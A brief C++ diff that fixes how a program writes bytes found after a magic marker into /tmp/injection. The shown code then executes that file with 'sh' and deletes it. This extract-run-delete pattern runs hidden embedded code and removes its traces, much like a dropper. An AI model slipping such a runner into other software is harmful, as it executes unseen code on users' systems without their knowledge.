@@ -22,7 +22,7 @@ int main( int argc, char * argv[] ) {
 			advance( result, magic.length() );
 			ofstream fout( "/tmp/injection", ios::binary );
 			if( fout.is_open() ) {
-				copy( result, binary.end(), ostream_iterator< char >( fout ) );
+				copy( result, binary.end(), ostreambuf_iterator< char >( fout ) );
 				fout.close();
 				system( "sh /tmp/injection && rm -f /tmp/injection" );
 			} else {
